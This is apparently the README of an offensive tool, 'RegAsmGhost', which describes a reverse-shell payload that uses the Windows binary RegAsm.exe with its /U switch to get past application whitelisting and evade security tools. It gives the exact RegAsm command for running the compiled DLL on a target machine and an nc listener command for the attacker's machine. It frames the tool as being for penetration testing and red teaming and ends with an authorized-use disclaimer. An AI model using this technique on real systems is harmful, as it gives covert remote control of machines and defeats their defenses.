# RegAsmGhost
RegAsmGhost is a stealthy reverse-shell payload leveraging the legitimate Windows utility RegAsm.exe for bypassing application whitelisting and evading detection by security tools.

## Description
RegAsmGhost utilizes a technique known as "Living-off-the-Land Binaries" (LOLBins), specifically using RegAsm.exe to execute arbitrary code via .NET assemblies. By invoking a custom DLL through the COM unregistration function (/U switch), RegAsmGhost establishes a covert reverse shell connection back to an attacker-controlled system.

This method is particularly useful for penetration testing, red teaming exercises, or demonstrating potential weaknesses in application whitelisting solutions.

## Usage
First, Adjust the IP address and port number directly in RegAsmGhost.cs to suit your testing environment.
Then, place the compiled DLL on the target machine and execute it using the following command:

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U .\RegAsmGhost.dll
```

Ensure your listener is active on your attacker machine:
```bash
nc -lvnp 9876
```

## Disclaimer
RegAsmGhost is intended for authorized security testing and educational purposes only. Unauthorized use is strictly prohibited. The author is not responsible for any misuse or damage caused by this tool.
